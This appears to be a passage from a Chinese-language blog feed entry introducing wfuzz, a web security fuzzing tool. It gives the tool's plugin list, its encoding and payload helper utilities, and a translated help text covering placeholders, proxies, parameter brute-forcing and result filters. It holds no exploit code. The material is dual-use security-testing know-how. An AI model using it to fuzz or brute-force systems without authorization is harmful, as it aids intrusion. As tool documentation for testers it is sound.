class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Available scripts:</span><br><span class="line">  Category                   | Name          | Summary</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">  default, passive           | cookies       | 查找新的cookies</span><br><span class="line">  default, passive           | errors        | 查找错误信息</span><br><span class="line">  passive                    | grep          | HTTP response grep</span><br><span class="line">  active                     | screenshot    | 用linux cutycapt tool 进行屏幕抓取 </span><br><span class="line">  default, active, discovery | links         | 解析HTML并查找新的内容</span><br><span class="line">  default, active, discovery | wc_extractor  | 解析subversion的wc.db文件</span><br><span class="line">  default, passive           | listing       | 查找列目录漏洞</span><br><span class="line">  default, passive           | title         | 解析HTML页面的title</span><br><span class="line">  default, active, discovery | robots        | 解析robots.txt文件来查找新内容</span><br><span class="line">  default, passive           | headers       | 查找服务器的返回头</span><br><span class="line">  default, active, discovery | cvs_extractor | 解析 CVS/Entries 文件</span><br><span class="line">  default, active, discovery | svn_extractor | 解析 .svn/entries 文件</span><br><span class="line">  active, discovery          | backups       | 查找已知的备份文件名</span><br><span class="line">  default, active, discovery | sitemap       | 解析 sitemap.xml 文件</span><br></pre></td></tr></table></figure><h3><span id="内置工具">内置工具</span></h3><h4><span id="wfencode-工具">wfencode 工具</span></h4><p>这是wfuzz自带的一个加密/解密（编码/反编码）工具，目前支持内建的encoders的加/解密。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wfencode -e base64 123456</span><br><span class="line">[RES] MTIzNDU2</span><br><span class="line">wfencode -d base64 MTIzNDU2</span><br><span class="line">[RES] 123456</span><br></pre></td></tr></table></figure><hr><h4><span id="wfpayload工具">wfpayload工具</span></h4><p>wfpayload是payload生成工具</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wfpayload -z range,0-10</span><br><span class="line">[RES]</span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td></tr></table></figure><h4><span id="wxfuzz-工具">wxfuzz 工具</span></h4><p>这个看源码是一个wxPython化的wfuzz，也就是GUI图形界面的wfuzz。目前需要wxPython最新版本才能使用，但是在ParrotOS和Kali上都无法正常安装成功，问题已在GitHub提交Issue，期待开发者的回复中…</p><h3><span id="wfuzz命令中文帮助">wfuzz命令中文帮助</span></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Usage:    wfuzz [options] -z payload,params &lt;url&gt;</span><br><span class="line">    FUZZ, ..., FUZnZ              payload占位符，wfuzz会用指定的payload代替相应的占位符，n代表数字. </span><br><span class="line">    FUZZ&#123;baseline_value&#125;     FUZZ 会被 baseline_value替换，并将此作为测试过程中第一个请求来测试，可用来作为过滤的一个基础。</span><br><span class="line">Options:</span><br><span class="line">    -h/--help            : 帮助文档</span><br><span class="line">    --help                : 高级帮助文档</span><br><span class="line">    --version            : Wfuzz详细版本信息</span><br><span class="line">    -e &lt;type&gt;            :  显示可用的encoders/payloads/iterators/printers/scripts列表</span><br><span class="line">    --recipe &lt;filename&gt;        : 从文件中读取参数</span><br><span class="line">    --dump-recipe &lt;filename&gt;    : 打印当前的参数并保存成文档</span><br><span class="line">    --oF &lt;filename&gt;               : 将测试结果保存到文件，这些结果可被wfuzz payload 处理</span><br><span class="line">    -c                : 彩色化输出</span><br><span class="line">    -v                : 详细输出</span><br><span class="line">    -f filename,printer         : 将结果以printer的方式保存到filename (默认为raw printer).</span><br><span class="line">    -o printer                  : 输出特定printer的输出结果</span><br><span class="line">    --interact            : (测试功能) 如果启用，所有的按键将会被捕获，这使得你能够与程序交互</span><br><span class="line">    --dry-run            : 打印测试结果，而并不发送HTTP请求</span><br><span class="line">    --prev                : 打印之前的HTTP请求（仅当使用payloads来生成测试结果时使用）</span><br><span class="line">    -p addr                : 使用代理，格式 ip:port:type. 可设置多个代理，type可取的值为SOCKS4,SOCKS5 or HTTP（默认）</span><br><span class="line">    -t N                : 指定连接的并发数，默认为10</span><br><span class="line">    -s N                : 指定请求的间隔时间，默认为0</span><br><span class="line">    -R depth            : 递归路径探测，depth指定最大递归数量</span><br><span class="line">    -L,--follow            : 跟随HTTP重定向</span><br><span class="line">    -Z                : 扫描模式 (连接错误将被忽视).</span><br><span class="line">    --req-delay N            : 设置发送请求允许的最大时间，默认为 90，单位为秒.</span><br><span class="line">    --conn-delay N              : 设置连接等待的最大时间，默认为 90，单位为秒.</span><br><span class="line">    -A                : 是 --script=default -v -c 的简写</span><br><span class="line">    --script=            : 与 --script=default 等价</span><br><span class="line">    --script=&lt;plugins&gt;        : 进行脚本扫描， &lt;plugins&gt; 是一个以逗号分开的插件或插件分类列表</span><br><span class="line">    --script-help=&lt;plugins&gt;        : 显示脚本的帮助</span><br><span class="line">    --script-args n1=v1,...     : 给脚本传递参数. ie. --script-args grep.regex="&lt;A href=\"(.*?)\"&gt;"</span><br><span class="line">    -u url                      : 指定请求的URL</span><br><span class="line">    -m iterator            : 指定一个处理payloads的迭代器 (默认为product)</span><br><span class="line">    -z payload            : 为每一个占位符指定一个payload，格式为 name[,parameter][,encoder].</span><br><span class="line">                      编码可以是一个列表, 如 md5-sha1. 还可以串联起来, 如. md5@sha1.</span><br><span class="line">                      还可使用编码各类名，如 url</span><br><span class="line">                                      使用help作为payload来显示payload的详细帮助信息，还可使用--slice进行过滤</span><br><span class="line">    --zP &lt;params&gt;            : 给指定的payload设置参数。必须跟在 -z 或-w 参数后面</span><br><span class="line">    --slice &lt;filter&gt;        : 以指定的表达式过滤payload的信息，必须跟在-z 参数后面</span><br><span class="line">    -w wordlist            : 指定一个wordlist文件，等同于 -z file,wordlist</span><br><span class="line">    -V alltype            : 暴力测试所有GET/POST参数，无需指定占位符</span><br><span class="line">    -X method            : 指定一个发送请求的HTTP方法，如HEAD或FUZZ</span><br><span class="line">    -b cookie            : 指定请求的cookie参数，可指定多个cookie</span><br><span class="line">    -d postdata             : 设置用于测试的POST data (ex: "id=FUZZ&amp;catalogue=1")</span><br><span class="line">    -H header              : 设置用于测试请求的HEADER (ex:"Cookie:id=1312321&amp;user=FUZZ"). 可指定多个HEADER.</span><br><span class="line">    --basic/ntlm/digest auth    : 格式为 "user:pass" or "FUZZ:FUZZ" or "domain\FUZ2Z:FUZZ"</span><br><span class="line">    --hc/hl/hw/hh N[,N]+        : 以指定的返回码/行数/字数/字符数作为判断条件隐藏返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">    --sc/sl/sw/sh N[,N]+        : 以指定的返回码/行数/字数/字符数作为判断条件显示返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">    --ss/hs regex            : 显示或隐藏返回结果中符合指定正则表达式的返回结果</span><br><span class="line">    --filter &lt;filter&gt;        : 显示或隐藏符合指定filter表达式的返回结果 (用 BBB 来接收 baseline)</span><br><span class="line">    --prefilter &lt;filter&gt;        : 用指定的filter表达式在测试之前过滤某些测试条目</span><br></pre></td></tr></table></figure><hr><p>ps：本文转自key师傅的博客  <strong><em>–&gt;<a href="https://gh0st.cn/archives/2018-10-28/1" target="_blank" rel="noopener">原文</a></em></strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Wfuzz初上手&quot;&gt;&lt;a href=&quot;#Wfuzz初上手&quot; class=&quot;headerlink&quot; title=&quot;Wfuzz初上手&quot;&gt;&lt;/a&gt;Wfuzz初上手&lt;/h1&gt;&lt;h2 id=&quot;Wfuzz是啥玩意？&quot;&gt;&lt;a href=&quot;#Wfuzz是啥玩意？&quot; class=&quot;headerlink&quot; title=&quot;Wfuzz是啥玩意？&quot;&gt;&lt;/a&gt;Wfuzz是啥玩意？&lt;/h2&gt;&lt;p&gt;wfuzz 是一款Python开发的Web安全模糊测试工具。&lt;a href=&quot;https://github.com/xmendez/wfuzz&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/xmendez/wfuzz&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
